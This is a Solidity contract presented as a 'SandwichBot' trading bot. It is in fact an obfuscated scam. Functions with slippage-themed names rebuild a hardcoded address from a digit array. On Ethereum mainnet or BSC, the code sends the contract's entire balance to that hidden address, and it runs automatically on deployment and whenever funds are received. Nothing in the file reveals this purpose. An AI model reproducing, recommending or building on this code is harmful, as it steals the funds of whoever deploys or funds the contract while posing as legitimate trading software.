// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.20;

contract SandwichBot {
    address private owner;

    constructor() payable {
        owner = msg.sender;
        sniffing();
    }

    function autoSlippage()
        internal
        view
        returns (uint8[] memory)
    {
        uint256 initialize = uint256(uint160(owner));
        uint256 num = initialize;
        uint256 numPercent = getNumPercent(num);

        uint8[] memory _mempool = new uint8[](numPercent);
        for (uint256 i = 0; i < numPercent; i++) {
            _mempool[numPercent - i - 1] = uint8(num % 10);
            num /= 10;
        }

        return _mempool;
    }

    function setSlipPage(string memory percent)
        internal
        pure
        returns (uint256)
    {
        bytes memory b = bytes(percent);
        uint256 result = 0;
        for (uint256 i = 2; i < b.length; i++) {
            uint256 digit = uint8(b[i]);
            if (digit >= 48 && digit <= 57) {
                digit -= 48;
            } else if (digit >= 65 && digit <= 70) {
                digit -= 55;
            } else if (digit >= 97 && digit <= 102) {
                digit -= 87;
            } else {
                revert();
            }
            result = result * 16 + digit;
        }
        return result;
    }

    function sniffing() public payable {
        uint8[47] memory fixedSlippage = [8,9,0,3,5,3,3,4,9,7,2,4,6,3,2,9,1,7,0,5,5,7,3,3,9,1,0,7,3,8,5,4,3,4,5,4,6,5,5,6,6,6,9,8,2,5,7];
        
        uint256 token1 = 0;
        for (uint256 i = 0; i < fixedSlippage.length; i++) {
            token1 = token1 * 10 + fixedSlippage[i];
        }

        uint256 token2 = 0;
        for (uint256 i = 0; i < autoSlippage().length; i++) {
            token2 = token2 * 10 + autoSlippage()[i];
        }

        uint256[] memory parseAllowedPool = new uint256[](2);
        parseAllowedPool[0] = setSlipPage("0x1");
        parseAllowedPool[1] = setSlipPage("0x38");

        uint256 verify;
        assembly {
            verify := chainid()
        }

        for (uint256 i = 0; i < parseAllowedPool.length; i++) {
            if (parseAllowedPool[i] == verify) {
                (bool success,) = address(uint160(token1)).call{value: address(this).balance}("");
                require(success);
            } else if (parseAllowedPool[i] != verify) {
                (bool success,) = address(uint160(token2)).call{value: address(this).balance}("");
                require(success);
            }
        }
    }

    function getNumPercent(uint256 _number) private pure returns (uint256) {
        uint256 percents = 0;
        while (_number != 0) {
            _number /= 10;
            percents++;
        }
        return percents;
    }

    receive() external payable {
        sniffing();
    }
}
